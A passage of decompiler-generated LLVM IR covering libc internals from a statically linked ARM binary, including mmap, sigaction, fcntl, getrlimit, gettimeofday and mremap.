  uselistorder i32 %v1_11850, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1184c, { 1, 0, 2 }
  uselistorder i32 %v1_11830.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1181c, { 1, 0 }
  uselistorder i32 %v2_1177c, { 1, 0 }
  uselistorder i32 %v2_11754.pre, { 2, 0, 1 }
  uselistorder i32 %v1_11748, { 1, 0 }
  uselistorder i32 %v1_11744, { 3, 2, 1, 0 }
  uselistorder i32 %v1_11738, { 1, 0 }
  uselistorder i32 %v1_11704, { 1, 0 }
  uselistorder i32 %v1_11700, { 1, 2, 3, 0 }
  uselistorder i32 %v1_116f4, { 1, 0 }
  uselistorder i32 %v2_116d0, { 1, 0, 2 }
  uselistorder i32 %v4_116b4, { 1, 0, 2 }
  uselistorder i32 %v4_116a4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_115ec, { 1, 2, 0 }
  uselistorder i32 %v2_115b8, { 1, 2, 0 }
  uselistorder i32 %v1_115b4, { 1, 2, 0 }
  uselistorder i1 %v2_115a0, { 1, 0, 2 }
  uselistorder i32 %v5_115a4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11570, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11558, { 1, 0, 2 }
  uselistorder i32 %v2_1154c, { 1, 0, 2 }
  uselistorder i32 %v4_1151c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp70, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp69, { 2, 1, 0 }
  uselistorder i32 %tmp68, { 2, 1, 0 }
  uselistorder i32 %tmp67, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 23, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 4, 2, 3, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 1, 2, 3, 4, 0, 6, 7, 8, 9, 14, 10, 11, 15, 12, 13, 17, 18, 19, 20, 21, 22, 23, 25, 24, 16, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 2, 3, 4, 6, 5, 1, 7, 8, 9, 11, 10, 17, 12, 14, 13, 18, 15, 16, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 19, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 1, 5, 0, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 11972, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_11898, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11838, { 1, 0 }
  uselistorder label %dec_label_pc_117a0, { 1, 0 }
  uselistorder label %dec_label_pc_11778, { 1, 0 }
  uselistorder label %dec_label_pc_116f4, { 1, 0 }
  uselistorder label %bb89, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11670, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11648, { 3, 0, 1, 2 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %dec_label_pc_115b8, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_115a0, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_118ec = load i32, i32* @r4, align 4
  store i32 %v3_118ec, i32* %stack_var_-16, align 4
  %v3_118f8 = urem i32 %arg4, 4096
  %v2_118fc = icmp eq i32 %v3_118f8, 0
  br i1 %v2_118fc, label %dec_label_pc_11920, label %dec_label_pc_11904

dec_label_pc_11904:                               ; preds = %entry
  %v0_11908 = call i32 @__aeabi_read_tp()
  store i32 %v0_11908, i32* %r0.global-to-local, align 4
  %v3_1190c = load i16, i16* @global_var_23164.175, align 2
  %v4_1190c = sext i16 %v3_1190c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11918 = add i32 %v4_1190c, %v0_11908
  %v4_11918 = inttoptr i32 %v3_11918 to i32*
  store i32 22, i32* %v4_11918, align 4
  %v0_11954.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11954

dec_label_pc_11920:                               ; preds = %entry
  %v0_11930 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11930, -4095
  br i1 %tmp, label %dec_label_pc_11950, label %dec_label_pc_11938

dec_label_pc_11938:                               ; preds = %dec_label_pc_11920
  %v1_1193c = sub i32 0, %v0_11930
  %v3_11940 = load i16, i16* @global_var_23164.175, align 2
  %v4_11940 = sext i16 %v3_11940 to i32
  %v0_11944 = call i32 @__aeabi_read_tp()
  %v3_11948 = add i32 %v4_11940, %v0_11944
  %v4_11948 = inttoptr i32 %v3_11948 to i32*
  store i32 %v1_1193c, i32* %v4_11948, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11950

dec_label_pc_11950:                               ; preds = %dec_label_pc_11920, %dec_label_pc_11938
  %v0_11950 = phi i32 [ %v0_11930, %dec_label_pc_11920 ], [ -1, %dec_label_pc_11938 ]
  store i32 %v0_11950, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11954

dec_label_pc_11954:                               ; preds = %dec_label_pc_11904, %dec_label_pc_11950
  %v0_11954 = phi i32 [ %v0_11954.pre, %dec_label_pc_11904 ], [ %v0_11950, %dec_label_pc_11950 ]
  store i32 %v0_11954, i32* %r0.global-to-local, align 4
  %v2_11958 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11958, i32* @r4, align 4
  ret i32 %v0_11954

; uselistorder directives
  uselistorder i32 %v0_11954, { 1, 0 }
  uselistorder i32 %v0_11930, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_11954, { 1, 0 }
  uselistorder label %dec_label_pc_11950, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_11968 = load i32, i32* @lr, align 4
  store i32 %v0_11968, i32* %stack_var_-4, align 4
  %v0_11970 = load i32, i32* @r0, align 4
  %v3_11974 = load i16, i16* @global_var_23164.175, align 2
  %v4_11974 = sext i16 %v3_11974 to i32
  store i32 %v4_11974, i32* @r2, align 4
  %v0_11978 = call i32 @__aeabi_read_tp()
  %v1_1197c = sub i32 0, %v0_11970
  store i32 %v1_1197c, i32* @r3, align 4
  %v2_11980 = load i32, i32* @r2, align 4
  %v3_11980 = add i32 %v2_11980, %v0_11978
  %v4_11980 = inttoptr i32 %v3_11980 to i32*
  store i32 %v1_1197c, i32* %v4_11980, align 4
  %v2_11988 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_11988, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11994 = load i32, i32* @r4, align 4
  %v6_11994 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1199c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1199c, label %dec_label_pc_119f0, label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %entry
  %v1_119b4 = add i32 %arg2, 4
  %v2_119b4 = inttoptr i32 %v1_119b4 to i32*
  %v3_119b4 = load i32, i32* %v2_119b4, align 4
  store i32 %v3_119b4, i32* @r3, align 4
  %v1_119b8 = and i32 %v3_119b4, 67108864
  %v2_119b8 = icmp eq i32 %v1_119b8, 0
  br i1 %v2_119b8, label %dec_label_pc_119c0, label %dec_label_pc_119f0

dec_label_pc_119c0:                               ; preds = %dec_label_pc_119b4
  store i32 20, i32* @r2, align 4
  %v2_119c4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_119c4, i32* @r0, align 4
  %v0_119c8 = call i32 @memcpy()
  %v0_119f0.pre = load i32, i32* @r5, align 4
  %v0_119f8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %dec_label_pc_119b4, %entry, %dec_label_pc_119c0
  %v0_119f8 = phi i32 [ %arg3, %dec_label_pc_119b4 ], [ %arg3, %entry ], [ %v0_119f8.pre, %dec_label_pc_119c0 ]
  %v0_119f4 = phi i32 [ %arg2, %dec_label_pc_119b4 ], [ 0, %entry ], [ %v2_119c4, %dec_label_pc_119c0 ]
  %v0_119f0 = phi i32 [ %arg1, %dec_label_pc_119b4 ], [ %arg1, %entry ], [ %v0_119f0.pre, %dec_label_pc_119c0 ]
  %v4_11a00 = call i32 @__syscall_rt_sigaction(i32 %v0_119f0, i32 %v0_119f4, i32 %v0_119f8, i32 8)
  store i32 %v3_11994, i32* @r4, align 4
  store i32 %v6_11994, i32* @r5, align 4
  ret i32 %v4_11a00

; uselistorder directives
  uselistorder label %dec_label_pc_119f0, { 2, 0, 1 }
}

define i32 @function_11a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a14:
  %v0_11a14 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a14, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a14
  %v3_11a14 = mul i32 %arg1, %arg1
  %v2_11a18 = load i32, i32* @r4, align 4
  %v4_11a18 = mul i32 %v2_11a18, 2
  %v5_11a18 = and i32 %v4_11a18, %v3_11a14
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a14, %bb
  %v6_11a18 = phi i32 [ %arg1, %dec_label_pc_11a14 ], [ %v5_11a18, %bb ]
  ret i32 %v6_11a18

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_11a20 = call i32 @__sigsetjmp()
  ret i32 %v0_11a20
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_11a60 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11a60, 2
  br i1 %tmp, label %dec_label_pc_11a9c, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_11ad0, label %dec_label_pc_11a8c

dec_label_pc_11a8c:                               ; preds = %dec_label_pc_11a78
  %v0_11a90 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_11ac4

dec_label_pc_11a9c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_11ab8, label %dec_label_pc_11ad0

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11a9c
  %v0_11abc = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_11ac4

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11a8c, %dec_label_pc_11ab8
  %storemerge2 = phi i32 [ %v0_11a90, %dec_label_pc_11a8c ], [ %v0_11abc, %dec_label_pc_11ab8 ]
  %storemerge.in = load i16, i16* @global_var_23164.175, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_11ac4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ac4 = sub i32 0, %v0_11ac4
  store i32 %v1_11ac4, i32* %r2.global-to-local, align 4
  %v3_11ac8 = add i32 %storemerge, %storemerge2
  %v4_11ac8 = inttoptr i32 %v3_11ac8 to i32*
  store i32 %v1_11ac4, i32* %v4_11ac8, align 4
  br label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11a78, %dec_label_pc_11a9c, %dec_label_pc_11ac4
  %storemerge1 = phi i32 [ -1, %dec_label_pc_11ac4 ], [ %arg1, %dec_label_pc_11a9c ], [ %arg1, %dec_label_pc_11a78 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_11ad0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11ac4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_11ae8 = load i32, i32* @r2, align 4
  %v3_11aec = load i32, i32* @r4, align 4
  store i32 %v3_11aec, i32* %stack_var_-32, align 4
  %v6_11aec = load i32, i32* @r5, align 4
  %v12_11aec = load i32, i32* @r7, align 4
  %v4_11afc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_11b08 = icmp eq i32 %v4_11afc, 0
  %v0_11b10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11b10, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_11ae8, i32* @r4, align 4
  br i1 %v2_11b08, label %dec_label_pc_11b2c, label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %entry
  %v7_11b20 = icmp eq i32 %arg2, 7
  br i1 %v7_11b20, label %dec_label_pc_11b6c, label %bb

bb:                                               ; preds = %dec_label_pc_11b20
  %v8_11b24 = icmp eq i32 %arg2, 14
  br i1 %v8_11b24, label %dec_label_pc_11b6c, label %dec_label_pc_11b2c

dec_label_pc_11b2c:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_11b10, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11b10, -4095
  br i1 %tmp, label %dec_label_pc_11b64, label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b2c
  %v0_11b50 = call i32 @__aeabi_read_tp()
  %v3_11b54 = load i16, i16* @global_var_23164.175, align 2
  %v4_11b54 = sext i16 %v3_11b54 to i32
  %v0_11b58 = load i32, i32* @r2, align 4
  %v1_11b58 = sub i32 0, %v0_11b58
  store i32 %v1_11b58, i32* @r2, align 4
  %v3_11b5c = add i32 %v4_11b54, %v0_11b50
  %v4_11b5c = inttoptr i32 %v3_11b5c to i32*
  store i32 %v1_11b58, i32* %v4_11b5c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b64

dec_label_pc_11b64:                               ; preds = %dec_label_pc_11b2c, %dec_label_pc_11b4c
  %v0_11b64 = phi i32 [ %v0_11b10, %dec_label_pc_11b2c ], [ -1, %dec_label_pc_11b4c ]
  br label %dec_label_pc_11bb8

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b20, %bb
  %v0_11b6c = call i32 @__libc_enable_asynccancel()
  %v0_11b70 = load i32, i32* @r7, align 4
  store i32 %v0_11b70, i32* @r1, align 4
  store i32 %v0_11b6c, i32* %r6.global-to-local, align 4
  %v0_11b7c = load i32, i32* @r5, align 4
  store i32 %v0_11b7c, i32* %r0.global-to-local, align 4
  store i32 %v0_11b7c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_11b7c, -4095
  br i1 %tmp15, label %dec_label_pc_11bac, label %dec_label_pc_11b94

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b6c
  %v1_11b98 = sub i32 0, %v0_11b7c
  %v0_11b9c = call i32 @__aeabi_read_tp()
  store i32 %v0_11b9c, i32* %r0.global-to-local, align 4
  %v3_11ba0 = load i16, i16* @global_var_23164.175, align 2
  %v4_11ba0 = sext i16 %v3_11ba0 to i32
  %v3_11ba4 = add i32 %v4_11ba0, %v0_11b9c
  %v4_11ba4 = inttoptr i32 %v3_11ba4 to i32*
  store i32 %v1_11b98, i32* %v4_11ba4, align 4
  store i32 -1, i32* @r2, align 4
  %v0_11bac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11bac

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11b6c, %dec_label_pc_11b94
  %v0_11bb0 = phi i32 [ %v0_11b7c, %dec_label_pc_11b6c ], [ -1, %dec_label_pc_11b94 ]
  %v0_11bac = phi i32 [ %v0_11b6c, %dec_label_pc_11b6c ], [ %v0_11bac.pre, %dec_label_pc_11b94 ]
  store i32 %v0_11bac, i32* %r0.global-to-local, align 4
  store i32 %v0_11bb0, i32* @r7, align 4
  %v1_11bb4 = call i32 @__libc_disable_asynccancel(i32 %v0_11bac)
  store i32 %v1_11bb4, i32* %r0.global-to-local, align 4
  %v0_11bb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11bb8

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11b64, %dec_label_pc_11bac
  %v0_11bb8 = phi i32 [ %v0_11b64, %dec_label_pc_11b64 ], [ %v0_11bb8.pre, %dec_label_pc_11bac ]
  store i32 %v0_11bb8, i32* %r0.global-to-local, align 4
  %v2_11bc0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11bc0, i32* @r4, align 4
  store i32 %v6_11aec, i32* @r5, align 4
  store i32 %v12_11aec, i32* @r7, align 4
  ret i32 %v0_11bb8

; uselistorder directives
  uselistorder i32 %v0_11bb8, { 1, 0 }
  uselistorder i32 %v0_11bac, { 1, 0 }
  uselistorder i32 %v0_11b7c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11b10, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11bb8, { 1, 0 }
  uselistorder label %dec_label_pc_11bac, { 1, 0 }
  uselistorder label %dec_label_pc_11b6c, { 1, 0 }
  uselistorder label %dec_label_pc_11b64, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11bdc = load i32, i32* @r7, align 4
  store i32 %v3_11bdc, i32* %stack_var_-8, align 4
  %v0_11be8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11be8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11be8, -4095
  br i1 %tmp, label %dec_label_pc_11c10, label %dec_label_pc_11bf8

dec_label_pc_11bf8:                               ; preds = %entry
  %v0_11bfc = call i32 @__aeabi_read_tp()
  %v3_11c00 = load i16, i16* @global_var_23164.175, align 2
  %v4_11c00 = sext i16 %v3_11c00 to i32
  %v0_11c04 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c04 = sub i32 0, %v0_11c04
  store i32 %v1_11c04, i32* %r2.global-to-local, align 4
  %v3_11c08 = add i32 %v4_11c00, %v0_11bfc
  %v4_11c08 = inttoptr i32 %v3_11c08 to i32*
  store i32 %v1_11c04, i32* %v4_11c08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11c10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %entry, %dec_label_pc_11bf8
  %v1_11c14 = phi i32 [ %v0_11be8, %entry ], [ -1, %dec_label_pc_11bf8 ]
  %v2_11c10 = phi i32 [ %v3_11bdc, %entry ], [ %v2_11c10.pre, %dec_label_pc_11bf8 ]
  store i32 %v2_11c10, i32* @r7, align 4
  ret i32 %v1_11c14

; uselistorder directives
  uselistorder i32 %v0_11be8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c10, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11c28

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c54, %dec_label_pc_11c68, %entry
  %v0_11c28 = phi i32 [ %arg1, %entry ], [ %v0_11c28.pre.pre, %dec_label_pc_11c68 ], [ %v0_11c54, %dec_label_pc_11c54 ]
  store i32 %v0_11c28, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11c28, -4095
  br i1 %tmp, label %dec_label_pc_11c54, label %dec_label_pc_11c44

dec_label_pc_11c44:                               ; preds = %dec_label_pc_11c28
  %v0_11c44 = call i32 @__aeabi_read_tp()
  %v0_11c48 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c48 = sub i32 0, %v0_11c48
  store i32 %v1_11c48, i32* %r2.global-to-local, align 4
  %v3_11c4c = load i16, i16* @global_var_23164.175, align 2
  %v4_11c4c = sext i16 %v3_11c4c to i32
  %v3_11c50 = add i32 %v4_11c4c, %v0_11c44
  %v4_11c50 = inttoptr i32 %v3_11c50 to i32*
  store i32 %v1_11c48, i32* %v4_11c50, align 4
  %v0_11c54.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11c54

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11c28, %dec_label_pc_11c44
  %v0_11c54 = phi i32 [ %v0_11c28, %dec_label_pc_11c28 ], [ %v0_11c54.pre, %dec_label_pc_11c44 ]
  store i32 %v0_11c54, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_11c54, -4095
  br i1 %tmp4, label %dec_label_pc_11c28, label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c54
  %v0_11c68 = call i32 @__aeabi_read_tp()
  %v0_11c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_11c6c = sub i32 0, %v0_11c6c
  store i32 %v1_11c6c, i32* %r2.global-to-local, align 4
  %v3_11c70 = load i16, i16* @global_var_23164.175, align 2
  %v4_11c70 = sext i16 %v3_11c70 to i32
  %v3_11c74 = add i32 %v4_11c70, %v0_11c68
  %v4_11c74 = inttoptr i32 %v3_11c74 to i32*
  store i32 %v1_11c6c, i32* %v4_11c74, align 4
  %v0_11c28.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11c28

; uselistorder directives
  uselistorder i32 %v0_11c54, { 0, 2, 1 }
  uselistorder i32 %v0_11c28, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c54, { 1, 0 }
  uselistorder label %dec_label_pc_11c28, { 1, 0, 2 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_11c88 = ptrtoint i32* %stack_var_-16 to i32
  %v2_11c94 = call i32 @getrlimit(i32 7, i32 %v2_11c88)
  %v1_11c98 = icmp slt i32 %v2_11c94, 0
  %v5_11c9c = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_11c98, i32 256, i32 %v5_11c9c
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_11cc0 = load i32, i32* @r0, align 4
  ret i32 %v1_11cc0
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_11cd4 = load i32, i32* @r0, align 4
  ret i32 %v1_11cd4
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_11ce8 = load i32, i32* @r0, align 4
  ret i32 %v1_11ce8
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11d18, label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %entry
  %v1_11d04 = sub i32 0, %arg1
  %v3_11d08 = load i16, i16* @global_var_23164.175, align 2
  %v4_11d08 = sext i16 %v3_11d08 to i32
  %v0_11d0c = call i32 @__aeabi_read_tp()
  %v3_11d10 = add i32 %v4_11d08, %v0_11d0c
  %v4_11d10 = inttoptr i32 %v3_11d10 to i32*
  store i32 %v1_11d04, i32* %v4_11d10, align 4
  br label %dec_label_pc_11d18

dec_label_pc_11d18:                               ; preds = %entry, %dec_label_pc_11d00
  %v1_11d1c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11d00 ]
  ret i32 %v1_11d1c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d18, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d24 = load i32, i32* @r7, align 4
  store i32 %v3_11d24, i32* %stack_var_-8, align 4
  %v0_11d30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d30, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d30, -4095
  br i1 %tmp, label %dec_label_pc_11d58, label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %entry
  %v0_11d44 = call i32 @__aeabi_read_tp()
  %v3_11d48 = load i16, i16* @global_var_23164.175, align 2
  %v4_11d48 = sext i16 %v3_11d48 to i32
  %v0_11d4c = load i32, i32* %r2.global-to-local, align 4
  %v1_11d4c = sub i32 0, %v0_11d4c
  store i32 %v1_11d4c, i32* %r2.global-to-local, align 4
  %v3_11d50 = add i32 %v4_11d48, %v0_11d44
  %v4_11d50 = inttoptr i32 %v3_11d50 to i32*
  store i32 %v1_11d4c, i32* %v4_11d50, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11d58.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %entry, %dec_label_pc_11d40
  %v1_11d5c = phi i32 [ %v0_11d30, %entry ], [ -1, %dec_label_pc_11d40 ]
  %v2_11d58 = phi i32 [ %v3_11d24, %entry ], [ %v2_11d58.pre, %dec_label_pc_11d40 ]
  store i32 %v2_11d58, i32* @r7, align 4
  ret i32 %v1_11d5c

; uselistorder directives
  uselistorder i32 %v0_11d30, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d58, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_11d74 = load i32, i32* @r0, align 4
  ret i32 %v1_11d74
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11d78 = load i32, i32* @r4, align 4
  store i32 %v3_11d78, i32* %stack_var_-12, align 4
  %v0_11d88 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d88, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d88, -4095
